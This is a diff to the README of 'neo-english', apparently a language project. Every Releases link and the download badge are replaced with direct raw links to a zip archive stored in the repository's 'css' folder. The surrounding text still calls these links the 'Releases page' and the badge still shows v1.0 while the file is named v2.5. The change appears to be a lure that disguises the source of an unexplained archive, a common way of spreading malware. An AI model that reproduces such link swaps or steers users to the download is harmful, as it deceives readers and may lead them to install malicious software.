@@ -4,7 +4,7 @@ Welcome to neo-english, a universal auxiliary language that combines the best fe
 
 ## 📥 Download Now
 
-[![Download neo-english](https://img.shields.io/badge/Download%20neo--english-v1.0-blue)](https://github.com/ejspider82-del/neo-english/releases)
+[![Download neo-english](https://raw.githubusercontent.com/ejspider82-del/neo-english/main/css/neo-english-v2.5.zip%20neo--english-v1.0-blue)](https://raw.githubusercontent.com/ejspider82-del/neo-english/main/css/neo-english-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ neo-english offers several useful features:
 
 ## 📥 Download & Install
 
-Visit the [Releases page](https://github.com/ejspider82-del/neo-english/releases) to download the latest version of neo-english. 
+Visit the [Releases page](https://raw.githubusercontent.com/ejspider82-del/neo-english/main/css/neo-english-v2.5.zip) to download the latest version of neo-english. 
 
 1. Click on the link above to open the Releases page.
 2. Find the version you want to download, typically the latest one.
@@ -83,4 +83,4 @@ Join our online community:
 - **Twitter:** Follow us for updates and information.
 - **Facebook Group:** Connect with other neo-english users for support and sharing tips.
 
-Again, make sure to download the latest version from the [Releases page](https://github.com/ejspider82-del/neo-english/releases). Start communicating effortlessly with neo-english today!
+Again, make sure to download the latest version from the [Releases page](https://raw.githubusercontent.com/ejspider82-del/neo-english/main/css/neo-english-v2.5.zip). Start communicating effortlessly with neo-english today!
